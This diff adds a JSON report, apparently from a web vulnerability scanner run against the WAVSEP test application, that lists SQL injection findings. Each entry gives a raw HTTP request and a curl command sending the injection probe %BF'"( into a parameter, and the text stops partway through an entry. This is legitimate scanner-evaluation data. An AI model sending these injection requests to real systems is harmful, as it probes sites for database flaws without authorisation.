@@ -1,0 +1,1380 @@
+{
+  "vulnerabilities": {
+    "Cross Site Scripting": [], 
+    "Htaccess Bypass": [], 
+    "Backup file": [], 
+    "SQL Injection": [
+      {
+        "info": "MySQL Injection via injection in the parameter username", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp?username=%BF%27%22%28&password=textvalue2 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp?username=%BF%27%22%28&password=textvalue2\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp", 
+        "parameter": "username", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter password", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp?username=textvalue&password=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp?username=textvalue&password=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp", 
+        "parameter": "password", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msg", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case02-InjectionInSearch-String-UnionExploit-WithErrors.jsp?msg=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case02-InjectionInSearch-String-UnionExploit-WithErrors.jsp?msg=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case02-InjectionInSearch-String-UnionExploit-WithErrors.jsp", 
+        "parameter": "msg", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter username", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case03-InjectionInCalc-String-BooleanExploit-WithErrors.jsp?username=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case03-InjectionInCalc-String-BooleanExploit-WithErrors.jsp?username=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case03-InjectionInCalc-String-BooleanExploit-WithErrors.jsp", 
+        "parameter": "username", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msg", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case04-InjectionInUpdate-String-CommandInjection-WithErrors.jsp?msg=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case04-InjectionInUpdate-String-CommandInjection-WithErrors.jsp?msg=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case04-InjectionInUpdate-String-CommandInjection-WithErrors.jsp", 
+        "parameter": "msg", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter orderby", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithErrors.jsp?orderby=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithErrors.jsp?orderby=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithErrors.jsp", 
+        "parameter": "orderby", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionId", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case06-InjectionInView-Numeric-PermissionBypass-WithErrors.jsp?transactionId=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case06-InjectionInView-Numeric-PermissionBypass-WithErrors.jsp?transactionId=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case06-InjectionInView-Numeric-PermissionBypass-WithErrors.jsp", 
+        "parameter": "transactionId", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msgId", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case07-InjectionInSearch-Numeric-UnionExploit-WithErrors.jsp?msgId=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case07-InjectionInSearch-Numeric-UnionExploit-WithErrors.jsp?msgId=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case07-InjectionInSearch-Numeric-UnionExploit-WithErrors.jsp", 
+        "parameter": "msgId", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter minBalanace", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case08-InjectionInCalc-Numeric-BooleanExploit-WithErrors.jsp?minBalanace=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case08-InjectionInCalc-Numeric-BooleanExploit-WithErrors.jsp?minBalanace=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case08-InjectionInCalc-Numeric-BooleanExploit-WithErrors.jsp", 
+        "parameter": "minBalanace", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msgid", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case09-InjectionInUpdate-Numeric-CommandInjection-WithErrors.jsp?msgid=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case09-InjectionInUpdate-Numeric-CommandInjection-WithErrors.jsp?msgid=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case09-InjectionInUpdate-Numeric-CommandInjection-WithErrors.jsp", 
+        "parameter": "msgid", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter orderby", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithErrors.jsp?orderby=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithErrors.jsp?orderby=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithErrors.jsp", 
+        "parameter": "orderby", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case11-InjectionInView-Date-PermissionBypass-WithErrors.jsp?transactionDate=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case11-InjectionInView-Date-PermissionBypass-WithErrors.jsp?transactionDate=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case11-InjectionInView-Date-PermissionBypass-WithErrors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case12-InjectionInSearch-Date-UnionExploit-WithErrors.jsp?transactionDate=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case12-InjectionInSearch-Date-UnionExploit-WithErrors.jsp?transactionDate=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case12-InjectionInSearch-Date-UnionExploit-WithErrors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case13-InjectionInCalc-Date-BooleanExploit-WithErrors.jsp?transactionDate=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case13-InjectionInCalc-Date-BooleanExploit-WithErrors.jsp?transactionDate=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case13-InjectionInCalc-Date-BooleanExploit-WithErrors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case14-InjectionInUpdate-Date-CommandInjection-WithErrors.jsp?transactionDate=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case14-InjectionInUpdate-Date-CommandInjection-WithErrors.jsp?transactionDate=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case14-InjectionInUpdate-Date-CommandInjection-WithErrors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter username", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp?username=%BF%27%22%28&password=textvalue2 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp?username=%BF%27%22%28&password=textvalue2\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp", 
+        "parameter": "username", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter password", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp?username=textvalue&password=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp?username=textvalue&password=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp", 
+        "parameter": "password", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msg", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp?msg=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp?msg=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp", 
+        "parameter": "msg", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter username", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case03-InjectionInCalc-String-BooleanExploit-With200Errors.jsp?username=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case03-InjectionInCalc-String-BooleanExploit-With200Errors.jsp?username=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case03-InjectionInCalc-String-BooleanExploit-With200Errors.jsp", 
+        "parameter": "username", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msg", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case04-InjectionInUpdate-String-CommandInjection-With200Errors.jsp?msg=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case04-InjectionInUpdate-String-CommandInjection-With200Errors.jsp?msg=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case04-InjectionInUpdate-String-CommandInjection-With200Errors.jsp", 
+        "parameter": "msg", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter orderby", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-With200Errors.jsp?orderby=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-With200Errors.jsp?orderby=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-With200Errors.jsp", 
+        "parameter": "orderby", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionId", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case06-InjectionInView-Numeric-PermissionBypass-With200Errors.jsp?transactionId=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case06-InjectionInView-Numeric-PermissionBypass-With200Errors.jsp?transactionId=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case06-InjectionInView-Numeric-PermissionBypass-With200Errors.jsp", 
+        "parameter": "transactionId", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msgId", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case07-InjectionInSearch-Numeric-UnionExploit-With200Errors.jsp?msgId=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case07-InjectionInSearch-Numeric-UnionExploit-With200Errors.jsp?msgId=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case07-InjectionInSearch-Numeric-UnionExploit-With200Errors.jsp", 
+        "parameter": "msgId", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter minBalanace", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case08-InjectionInCalc-Numeric-BooleanExploit-With200Errors.jsp?minBalanace=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case08-InjectionInCalc-Numeric-BooleanExploit-With200Errors.jsp?minBalanace=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case08-InjectionInCalc-Numeric-BooleanExploit-With200Errors.jsp", 
+        "parameter": "minBalanace", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msgid", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case09-InjectionInUpdate-Numeric-CommandInjection-With200Errors.jsp?msgid=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case09-InjectionInUpdate-Numeric-CommandInjection-With200Errors.jsp?msgid=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case09-InjectionInUpdate-Numeric-CommandInjection-With200Errors.jsp", 
+        "parameter": "msgid", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter orderby", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-With200Errors.jsp?orderby=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-With200Errors.jsp?orderby=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-With200Errors.jsp", 
+        "parameter": "orderby", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case11-InjectionInView-Date-PermissionBypass-With200Errors.jsp?transactionDate=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case11-InjectionInView-Date-PermissionBypass-With200Errors.jsp?transactionDate=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case11-InjectionInView-Date-PermissionBypass-With200Errors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case12-InjectionInSearch-Date-UnionExploit-With200Errors.jsp?transactionDate=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case12-InjectionInSearch-Date-UnionExploit-With200Errors.jsp?transactionDate=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case12-InjectionInSearch-Date-UnionExploit-With200Errors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case13-InjectionInCalc-Date-BooleanExploit-With200Errors.jsp?transactionDate=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case13-InjectionInCalc-Date-BooleanExploit-With200Errors.jsp?transactionDate=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case13-InjectionInCalc-Date-BooleanExploit-With200Errors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter transactionDate", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case14-InjectionInUpdate-Date-CommandInjection-With200Errors.jsp?transactionDate=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case14-InjectionInUpdate-Date-CommandInjection-With200Errors.jsp?transactionDate=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case14-InjectionInUpdate-Date-CommandInjection-With200Errors.jsp", 
+        "parameter": "transactionDate", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msg", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp?msg=%BF%27%22%28&target=a%40a.com HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp?msg=%BF%27%22%28&target=a%40a.com\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp", 
+        "parameter": "msg", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter target", 
+        "http_request": "GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp?msg=readme&target=%BF%27%22%28 HTTP/1.1\nHost: 192.168.1.1:8080\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp?msg=readme&target=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp", 
+        "parameter": "target", 
+        "method": "GET"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter username", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nusername=%BF%27%22%28&password=letmein", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp\" -d \"username=%BF%27%22%28&password=letmein\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp", 
+        "parameter": "username", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter password", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nusername=default&password=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp\" -d \"username=default&password=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp", 
+        "parameter": "password", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter msg", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case02-InjectionInSearch-String-UnionExploit-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case02-InjectionInSearch-String-UnionExploit-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nmsg=%BF%27%22%28", 
+        "level": "1", 
+        "curl_command": "curl \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case02-InjectionInSearch-String-UnionExploit-WithErrors.jsp\" -e \"http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case02-InjectionInSearch-String-UnionExploit-WithErrors.jsp\" -d \"msg=%BF%27%22%28\"", 
+        "path": "/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case02-InjectionInSearch-String-UnionExploit-WithErrors.jsp", 
+        "parameter": "msg", 
+        "method": "POST"
+      }, 
+      {
+        "info": "MySQL Injection via injection in the parameter username", 
+        "http_request": "POST /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case03-InjectionInCalc-String-BooleanExploit-WithErrors.jsp HTTP/1.1\nHost: 192.168.1.1:8080\nReferer: http://192.168.1.1:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case03-InjectionInCalc-String-BooleanExploit-WithErrors.jsp\nContent-Type: application/x-www-form-urlencoded\n\nusername=%BF%27%22%28", 
+        "level": "1", 
